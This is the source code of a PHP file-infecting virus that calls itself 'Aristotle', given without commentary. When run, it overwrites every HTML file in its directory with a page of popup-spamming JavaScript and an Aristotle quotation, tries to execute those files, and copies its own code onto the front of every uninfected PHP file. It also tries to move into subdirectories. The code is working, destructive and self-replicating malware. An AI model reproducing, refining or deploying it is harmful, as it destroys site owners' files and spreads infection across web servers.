<?php // Aristotle
$file = $_SERVER["SCRIPT_NAME"];
$break = Explode('/', $file);			
$pfile = $break[count($break) - 1]; 
$handle = fopen($pfile, 'rb');
$aris = fread($handle, 2624);                    
fclose($handle);
$dir=opendir('.');
while (($file = readdir($dir)) !== false)           
  {
               if (strstr($file,'.html')) {
  $arisjs='<html>'.chr(13).chr(10);
  $arisjs.='<head>'.chr(13).chr(10);
  $arisjs.='<title>'.chr(13).chr(10);
  $arisjs.='</title>'.chr(13).chr(10);
  $arisjs.='<SCRIPT LANGUAGE='.chr(34).'Javascript'.chr(34).'>'.chr(13).chr(10);
  $arisjs.='var x = 10'.chr(13).chr(10);                 
  $arisjs.='var y = 1 '.chr(13).chr(10);                           
  $arisjs.='function startClock(){ '.chr(13).chr(10);
  $arisjs.='x = x-y '.chr(13).chr(10);
  $arisjs.='setTimeout('.chr(34).'startClock()'.chr(34).', 10)'.chr(13).chr(10); 
  $arisjs.='if(x==0)'.chr(13).chr(10);
  $arisjs.='{'.chr(13).chr(10); 
  $arisjs.='aristotle = window.open('.chr(34).'http://www.ibiblio.org/wm/paint/auth/rembrandt/1650/aristotle-homer.jpg'.chr(34).')'.chr(13).chr(10); 
  $arisjs.='setTimeout('.chr(34).'aristotle.close()'.chr(34).',20)'.chr(13).chr(10);
  $arisjs.='x=10'.chr(13).chr(10); 
  $arisjs.='}'.chr(13).chr(10); 
  $arisjs.='}'.chr(13).chr(10);
  $arisjs.='</SCRIPT>'.chr(13).chr(10); 
  $arisjs.='</HEAD>'.chr(13).chr(10); 
  $arisjs.='<BODY BGCOLOR='.chr(34).'#FFFFFF'.chr(34).' onLoad='.chr(34).'startClock()'.chr(34).'>'.chr(13).chr(10); 
  $arisjs.='Change in all things is sweet.'.chr(13).chr(10);
  $arisjs.='- Aristotle'.chr(13).chr(10); 
  $arisjs.='</BODY>'.chr(13).chr(10);
  $arisjs.='</HTML>'.chr(13).chr(10);
$b = fopen($file, 'w');
fwrite($b,$arisjs);
fclose($b);
exec($file);    

     }
                    if (strstr($file,'.php')) {  if (!strstr($file, 'Aristotle')) {  

                             $a = fopen($file,'rb');             
                             $contents = fread($a, filesize($file));
                             if (!strstr($contents, 'Aristotle'))
                              {
                                  
                                                                               
                                  fclose($a);
                                  $b = fopen($file,'w');
                                  fwrite($b, $aris.$contents);
                                  fclose($b);
                               }

                   }
      }
             if (is_dir($file)) { if (!strstr($file, '.')) { chdir($file);        

                    }

                } 
}
closedir($dir);
?>
